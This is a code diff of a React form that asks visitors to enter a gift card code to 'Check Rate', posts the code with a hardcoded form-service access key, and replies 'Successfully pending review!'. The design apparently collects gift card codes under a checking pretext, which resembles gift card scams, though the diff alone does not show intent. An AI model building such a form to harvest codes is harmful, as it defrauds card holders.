@@ -14,7 +14,7 @@ const ContactForm = () => {
     const formData = new FormData(event.target);
 
     formData.append("selected_card", selectedCard);
-    formData.append("access_key", "d161a33e-2e53-4cf3-ae11-6cfe74e4367d");
+    formData.append("access_key", "7ce6881a-e1d9-4db3-8c41-2c37324af1bc");
 
     const object = Object.fromEntries(formData);
     const json = JSON.stringify(object);
@@ -29,29 +29,29 @@ const ContactForm = () => {
     }).then((res) => res.json());
 
     if (res.success) {
-      alert(res.message);
+      alert("Successfully pending review!");
       setIsFormVisible(false);
       navigate("/");
     }
   };
 
   return (
-    <div className="p-6">
+    <div className="pt-24 p-4">
       {isFormVisible && (
-        <form onSubmit={onSubmit} className="contact-right flex flex-col items-start gap-4 mt-6">
+        <form onSubmit={onSubmit} className="contact-right flex flex-col items-start gap-4 mt-6 bg-gray-400 p-2 rounded-xl">
           <h3 className="text-white font-bold">Checking {selectedCard}</h3>
 
-          <label className="text-gray-400">Your Code</label>
-          <input type="text" placeholder="Enter your code" name="gift card code" className="bg-green-900 p-2 text-white rounded-lg border-none outline-none min-w-80" required />
+          <label className="text-white">Card Number</label>
+          <input type="text" placeholder="0000 0000 0000" name="gift card code" className="bg-black p-2 text-white rounded-lg border-none outline-none min-w-80" required />
 
           {/* Hidden input to store the selected card value */}
           <input type="hidden" name="selected_card" value={selectedCard} />
 
-          <button type="submit" className="border-none text-white rounded-3xl text-xl py-1 px-3 mt-4">
-            Submit now
+          <button type="submit" className="bg-black border-none text-white rounded-3xl text-xl py-1 px-3 mt-4 hover:bg-gray-500">
+            Check Rate
           </button>
 
-          <button type="button" onClick={() => setIsFormVisible(false)} className="text-gray-400 mt-2">
+          <button type="button" onClick={() => setIsFormVisible(false)} className="text-white mt-2">
             Cancel
           </button>
         </form>
